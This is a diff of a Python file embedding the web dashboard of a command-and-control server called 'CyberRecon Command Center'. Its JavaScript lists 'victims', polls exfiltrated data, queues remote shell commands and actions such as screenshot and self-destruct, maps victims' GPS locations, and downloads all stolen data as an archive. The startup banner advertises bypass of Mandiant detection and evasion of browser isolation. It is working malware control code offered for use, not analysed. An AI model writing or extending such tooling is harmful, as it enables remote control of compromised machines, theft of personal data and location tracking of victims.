-                out.scrollTop = out.scrollHeight;
-                log(`Shell failed: ${e.message}`, 'error');
-            }
-        }
-        let victimsTimer = null;
-        let exfilTimer = null;
-        let fastPollUntil = 0;
-        let exfilRunning = false;
-        function currentExfilInterval() {
-            return Date.now() < fastPollUntil ? 1000 : 3000;
-        }
-        function scheduleExfilPoll() {
-            clearTimeout(exfilTimer);
-            exfilTimer = setTimeout(async () => {
-                if (selectedVictim && !exfilRunning) {
-                    exfilRunning = true;
-                    try { await refreshExfilData(); }
-                    finally { exfilRunning = false; }
-                }
-                scheduleExfilPoll();
-            }, currentExfilInterval());
-        }
-        function startPolling() {
-            if (!victimsTimer) victimsTimer = setInterval(refreshVictims, 3000);
-            if (!exfilTimer) scheduleExfilPoll();
-        }
-        function stopPolling() {
-            if (victimsTimer) { clearInterval(victimsTimer); victimsTimer = null; }
-            if (exfilTimer) { clearTimeout(exfilTimer); exfilTimer = null; }
-        }
-        function enterFastPoll() {
-            fastPollUntil = Date.now() + 15000;
-            scheduleExfilPoll();
-        }
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                stopPolling();
-            } else {
-                refreshVictims();
-                if (selectedVictim) refreshExfilData();
-                startPolling();
-            }
-        });
-        const dropdownEl = document.getElementById('cmd-dropdown');
-        const dropdownToggle = document.getElementById('cmd-toggle');
-        const dropdownMenu = document.getElementById('cmd-menu');
-        const dropdownLabel = document.getElementById('cmd-toggle-label');
-        let selectedCmd = 'screenshot';
-        if (dropdownToggle) {
-            dropdownToggle.addEventListener('click', (e) => {
-                e.stopPropagation();
-                dropdownMenu.classList.toggle('open');
-            });
-            document.querySelectorAll('#cmd-menu .dropdown-item').forEach(item => {
-                item.addEventListener('click', () => {
-                    selectedCmd = item.dataset.value;
-                    dropdownLabel.textContent = item.textContent.trim();
-                    document.querySelectorAll('#cmd-menu .dropdown-item').forEach(i => i.classList.remove('active'));
-                    item.classList.add('active');
-                    dropdownMenu.classList.remove('open');
-                });
-            });
-            document.querySelector('#cmd-menu .dropdown-item[data-value="screenshot"]').classList.add('active');
-            document.addEventListener('click', (e) => {
-                if (!dropdownEl.contains(e.target)) dropdownMenu.classList.remove('open');
-            });
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'Escape') dropdownMenu.classList.remove('open');
-            });
-        }
-        const shellHistory = [];
-        let shellHistoryIdx = -1;
-        const shellInputEl = document.getElementById('shell-input');
-        if (shellInputEl) {
-            shellInputEl.addEventListener('keydown', (e) => {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    const val = shellInputEl.value.trim();
-                    if (val && shellHistory[shellHistory.length - 1] !== val) {
-                        shellHistory.push(val);
-                    }
-                    shellHistoryIdx = shellHistory.length;
-                    sendShellCommand();
-                } else if (e.key === 'ArrowUp') {
-                    if (shellHistoryIdx > 0) {
-                        shellHistoryIdx--;
-                        shellInputEl.value = shellHistory[shellHistoryIdx];
-                        setTimeout(() => shellInputEl.setSelectionRange(shellInputEl.value.length, shellInputEl.value.length), 0);
-                    }
-                    e.preventDefault();
-                } else if (e.key === 'ArrowDown') {
-                    if (shellHistoryIdx < shellHistory.length - 1) {
-                        shellHistoryIdx++;
-                        shellInputEl.value = shellHistory[shellHistoryIdx];
-                    } else {
-                        shellHistoryIdx = shellHistory.length;
-                        shellInputEl.value = '';
-                    }
-                    e.preventDefault();
-                }
-            });
-        }
-        refreshVictims();
-        startPolling();
-        log('Command Center initialized • Polling active', 'info');
-    </script>
+      }
+    } catch (e) { /* ignore */ }
+  }
+
+  function renderGPS(loc) {
+    if (typeof loc === 'string') { try { loc = JSON.parse(loc); } catch(e) { return; } }
+    const lat = parseFloat(loc.latitude);
+    const lon = parseFloat(loc.longitude);
+    const el = document.getElementById('gps-panel');
+    if (loc.error || isNaN(lat) || isNaN(lon) || (lat === 0 && lon === 0)) {
+      el.innerHTML = `<div style="padding:14px;color:var(--muted);font-size:12px">${loc.error || 'Location unavailable'}</div>`;
+      return;
+    }
+    const d = 0.01;
+    const bbox = `${(lon-d).toFixed(6)},${(lat-d).toFixed(6)},${(lon+d).toFixed(6)},${(lat+d).toFixed(6)}`;
+    const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
+    el.innerHTML = `
+      <div style="width:100%">
+        <div style="padding:10px;font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:var(--emerald)">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
+        <div style="padding:0 10px 10px;font-size:11.5px;color:var(--muted)">📍 ${loc.source || 'unknown'}</div>
+        <iframe src="${mapUrl}" style="width:100%;height:180px;border:0;border-radius:0 0 12px 12px;display:block" loading="lazy"></iframe>
+      </div>`;
+  }
+
+  // ── Command send ─────────────────────────
+  async function sendCommand(cmdName) {
+    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
+    try {
+      const resp = await fetch(`/command/${selectedVictim}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Operator-Token': OPERATOR_TOKEN
+        },
+        body: JSON.stringify({ command: cmdName })
+      });
+      const data = await resp.json();
+      if (!resp.ok) throw new Error(data.error || `HTTP ${resp.status}`);
+      consoleLog('info', `Command queued: ${cmdName}`);
+    } catch (e) {
+      consoleLog('err', `Command failed: ${e.message}`);
+    }
+  }
+
+  // ── Shell send ───────────────────────────
+  async function sendShell() {
+    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
+    const input = document.getElementById('shell-input');
+    const out = document.getElementById('shell-output');
+    const raw = input.value.trim();
+    if (!raw) return;
+    if (out.textContent === 'No commands run yet.') out.textContent = '';
+    out.textContent += `$ ${raw}\n`;
+    out.scrollTop = out.scrollHeight;
+    try {
+      const resp = await fetch(`/shell/${selectedVictim}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Operator-Token': OPERATOR_TOKEN
+        },
+        body: JSON.stringify({ command: raw })
+      });
+      const data = await resp.json();
+      if (!resp.ok) throw new Error(data.error || `HTTP ${resp.status}`);
+      consoleLog('info', `Shell queued: ${raw}`);
+      input.value = '';
+    } catch (e) {
+      out.textContent += `[ERROR] ${e.message}\n`;
+      out.scrollTop = out.scrollHeight;
+      consoleLog('err', `Shell failed: ${e.message}`);
+    }
+  }
+
+  // ── Wire up buttons ──────────────────────
+  document.getElementById('send-btn').onclick = () => {
+    sendCommand(document.getElementById('cmd-select').value);
+  };
+  document.getElementById('destruct-btn').onclick = () => {
+    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
+    if (confirm('Send SELF DESTRUCT to this victim?')) {
+      sendCommand('self_destruct');
+    }
+  };
+  document.getElementById('download-btn').onclick = () => {
+    if (!selectedVictim) { consoleLog('err', 'No victim selected'); return; }
+    fetch(`/download-all/${selectedVictim}?t=${Date.now()}`, {
+      headers: { 'X-Operator-Token': OPERATOR_TOKEN }
+    }).then(async r => {
+      if (!r.ok) throw new Error(`HTTP ${r.status}`);
+      const blob = await r.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `CyberRecon_${selectedVictim}.zip`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      consoleLog('ok', 'Data downloaded');
+    }).catch(e => consoleLog('err', `Download failed: ${e.message}`));
+  };
+  document.getElementById('shell-exec-btn').onclick = sendShell;
+  document.getElementById('shell-input').addEventListener('keydown', e => {
+    if (e.key === 'Enter') { e.preventDefault(); sendShell(); }
+  });
+  document.getElementById('victim-select').addEventListener('change', e => {
+    selectedVictim = e.target.value || null;
+    resetExfilPanels();
+    if (selectedVictim) {
+      consoleLog('info', `Selected: ${victims[selectedVictim]?.hostname || 'unknown'}`);
+      refreshExfil();
+    }
+  });
+  document.getElementById('search-input').addEventListener('input', e => {
+    const q = e.target.value.toLowerCase();
+    document.querySelectorAll('#victims-tbody tr').forEach(tr => {
+      tr.style.display = tr.textContent.toLowerCase().includes(q) ? '' : 'none';
+    });
+  });
+
+  // ── Main poll loop ───────────────────────
+  refreshVictims();
+  refreshEvents();
+  setInterval(refreshVictims, 3000);
+  setInterval(refreshEvents, 5000);
+  setInterval(() => { if (selectedVictim) refreshExfil(); }, 2500);
+  consoleLog('info', 'Command Center initialized');
+</script>
 </body>
 </html>
 """
@@ -1550,7 +1681,7 @@ def dashboard():
 if __name__ == "__main__":
     load_victims()
     print("=" * 60)
-    print("  ⚡ CyberRecon Command Center v3.5.1 (DEADLOCK FIX)")
+    print("  ⚡ CyberRecon Command Center v3.6.0 (NOVA GUI)")
     print("  Mandiant QR C2 Bypass • Browser Isolation Evasion")
     print("=" * 60)
     print(f"  Operator auth: {'ON' if REQUIRE_AUTH else 'OFF'}")
@@ -1578,9 +1709,6 @@ if __name__ == "__main__":
     scheme = "https" if ssl_ctx else "http"
     print(f"  REST API:    {scheme}://0.0.0.0:8443")
     print(f"  Dashboard:   {scheme}://0.0.0.0:8443/dashboard  (login required)")
-    print("=" * 60)
-    print("[i] Victim env: CYBERRECON_C2 / CYBERRECON_KEY / CYBERRECON_VICTIM_KEY must match.")
-    print("[i] Self-destruct purges victim data from server memory + disk.")
     print("=" * 60)
 
     try:
